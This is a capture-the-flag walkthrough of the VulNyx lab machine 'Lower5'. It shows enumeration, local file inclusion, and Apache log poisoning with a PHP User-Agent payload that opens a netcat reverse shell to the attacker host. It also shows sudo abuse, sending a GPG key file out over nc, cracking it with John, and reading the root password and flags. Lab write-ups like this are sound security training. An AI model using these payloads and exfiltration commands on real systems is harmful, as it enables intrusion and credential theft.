# VulNyx - Lower5

## Information

## Solution

### Enumeration
#### Nmap
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 10.11.5.14
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-18 16:43 +07
Nmap scan report for 10.11.5.14
Host is up (0.0010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: vTeam a Corporate Multipurpose Free Bootstrap Responsive template
MAC Address: 08:00:27:BD:64:D6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.56 seconds
```

#### Gobuster
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://10.11.5.14/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.5.14/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 309] [--> http://10.11.5.14/assets/]
/server-status        (Status: 403) [Size: 275]
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```

#### Ffuf
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ffuf -u http://10.11.5.14/FUZZ -w /usr/share/wordlists/dirb/common.txt -s
assets
.htpasswd
.htaccess
.hta
index.php

server-status
```

#### Web
![lfi-web](/walkthroughs/vulnyx/low-difficulty/32_lower5/lfi-web.png)

**Local File Inclusion (LFI)**

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh=52 2>/dev/null http://10.11.5.14/page.php?inc=FUZZ 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.11.5.14/page.php?inc=FUZZ
Total requests: 930

=====================================================================
ID           Response   Lines    Word       Chars       Payload             
=====================================================================

000000258:   200        22 L     26 W       1051 Ch     "/etc/passwd"       
000000649:   200        233426   2838707    22443598    "/var/log/apache2/ac
                         L       W          Ch          cess.log"           

Total time: 0
Processed Requests: 930
Filtered Requests: 928
Requests/sec.: 0
```

### Shell
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET "http://10.11.5.14/page.php?inc=/etc/passwd" | grep "sh$"
root:x:0:0:root:/root:/bin/bash
low:x:1000:1000:low:/home/low:/bin/bash

┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -sX GET "http://10.11.5.14/page.php?inc=/var/log/apache2/access.log" | head -n5

10.11.5.4 - - [18/May/2026:11:43:55 +0200] "GET / HTTP/1.0" 200 11884 "-" "-"
10.11.5.4 - - [18/May/2026:11:43:55 +0200] "GET /nmaplowercheck1779097437 HTTP/1.1" 404 452 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.11.5.4 - - [18/May/2026:11:43:55 +0200] "GET / HTTP/1.1" 200 11925 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
10.11.5.4 - - [18/May/2026:11:43:55 +0200] "PROPFIND / HTTP/1.1" 200 11925 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
```

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -s -H "User-Agent: <?php system('busybox nc 10.11.5.4 4444 -e /bin/sh'); ?>" "http:/10.11.5.14/"
```
#### Shell (www-data)
Refreshing the page gives me the shell as user `www-data`:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.14] 45578
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname
lower5
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@lower5:/var/www/html$
```

```bash
www-data@lower5:/var/www/html$ sudo -l
Matching Defaults entries for www-data on lower5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on lower5:
    (low) NOPASSWD: /usr/bin/bash
```
#### Shell (low)
```bash
www-data@lower5:/var/www/html$ sudo -u low /usr/bin/bash -i
low@lower5:/var/www/html$ id;hostname
uid=1000(low) gid=1000(low) groups=1000(low)
lower5
```

### Privilege Escalation
#### Enumeration
```bash
low@lower5:/var/www/html$ sudo -l
Matching Defaults entries for low on lower5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User low may run the following commands on lower5:
    (root) NOPASSWD: /usr/bin/pass
```
#### Abuse
User `low` has permission to run the `/usr/bin/pass` tool as `root` without entering a password.`pass` is the standard Linux password manager (The Standard Unix Password Manager).

```bash
low@lower5:/var/www/html$ sudo -u root /usr/bin/pass
Password Store
`-- root
    `-- password

low@lower5:/var/www/html$ sudo -u root /usr/bin/pass root/password



       ┌───────────────────────────────────────────────────────────────┐
       │ Please enter the passphrase to unlock the OpenPGP secret key: │
       │ "administrator (password) <admin@lower5.nyx>"                 │
       │ 1024-bit RSA key, ID E70EBB1C2CFFB642,                        │
       │ created 2025-04-09 (main key ID 9AD17885DA2449A1).            │
       │                                                               │
       │                                                               │
       │ Passphrase: _________________________________________________ │
       │                                                               │
       │         <OK>                                   <Cancel>       │
       └───────────────────────────────────────────────────────────────┘

```
```bash
low@lower5:/var/www/html$ cd   
low@lower5:~$ ls
root.gpg  user.txt
low@lower5:~$ nc 10.11.5.4 1234 < root.gpg
```
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nc -lvnp 1234 > root.gpg
listening on [any] 1234 ...
connect to [10.11.5.4] from (UNKNOWN) [10.11.5.14] 43182
                                                                                 ┌──(dungcngo㉿kali)-[/tmp]
└─$ ls
config-err-qoeK95
root.gpg
...

┌──(dungcngo㉿kali)-[/tmp]
└─$ gpg2john root.gpg > hash

┌──(dungcngo㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (administrator)     
1g 0:00:03:56 DONE (2026-05-18 22:00) 0.004224g/s 14.81p/s 14.81c/s 14.81C/s Password1..wateva
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We have pass of `administrator`: `Password1`.

```bash
low@lower5:~$ sudo -u root /usr/bin/pass root/password
r00tP@zzW0rD123
low@lower5:~$ su - root
Password: 
root@lower5:~# id ; hostname
uid=0(root) gid=0(root) grupos=0(root)
lower5
```
#### Flags
```bash
root@lower5:~# find / -name root.txt -o -name user.txt 2>/dev/null |xargs cat
008cdc7563e1d5afbcac3a241eba4db8
30a7b18992fef054ca6d904769fac413
```

***You are welcome!***
